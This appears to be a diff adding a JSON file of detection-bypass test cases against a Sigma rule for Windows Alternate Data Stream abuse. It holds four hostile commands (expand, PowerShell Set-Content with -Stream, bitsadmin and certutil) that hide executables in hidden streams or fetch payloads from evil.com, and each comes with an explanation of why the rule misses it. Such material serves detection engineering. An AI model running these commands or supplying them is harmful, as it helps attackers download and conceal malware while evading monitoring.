@@ -1,0 +1,18 @@
+[
+  {
+    "output": "cmd /c \"expand C:\\path\\\to\\malicious.cab C:\\Windows\\\temp\\legit.txt:malicious.exe\"",
+    "explanation": "The rule specifically looks for 'makecab' and '.cab' in the same command line, but it does not monitor the 'expand' utility, which can also be used to extract files into an Alternate Data Stream. By using a tool not listed in the 'selection\\_tools\\_\\*' filters, the logic fails to trigger."
+  },
+  {
+    "output": "powershell -Command \"Set-Content -Path '.\\\readme.txt' -Stream 'hidden' -Value (Get-Content '.\\malware.exe' -Encoding Byte); Start-Process '.\\\readme.txt:hidden'\"",
+    "explanation": "The Sigma rule relies on command-line patterns for specific legacy Windows tools (type, reg, esentutl, etc.) and the presence of 'txt:'. It does not account for native PowerShell cmdlets like Set-Content or Add-Content using the -Stream parameter, nor does it cover non-txt file extensions being used as the base file."
+  },
+  {
+    "output": "bitsadmin /transfer myDownload /download /priority high http://evil.com/payload.exe C:\\Windows\\Temp\\log.log:payload.exe",
+    "explanation": "The rule logic requires 'selection\\_stream' (the string 'txt:') AND one of the tool selections. This command bypasses the rule by using bitsadmin (not in the tool list) and using a '.log' extension instead of '.txt', failing both sides of the 'and' condition."
+  },
+  {
+    "output": "certutil -urlcache -split -f http://evil.com/base64\\_payload.txt C:\\\temp\\data.dat:payload.exe",
+    "explanation": "Certutil is a common LOLBIN for ingress tool transfer. Since 'certutil' is not defined in any of the 'selection\\_tools' identifiers and the destination stream is attached to a '.dat' file rather than a '.txt' file, the rule will not detect this execution."
+  }
+]
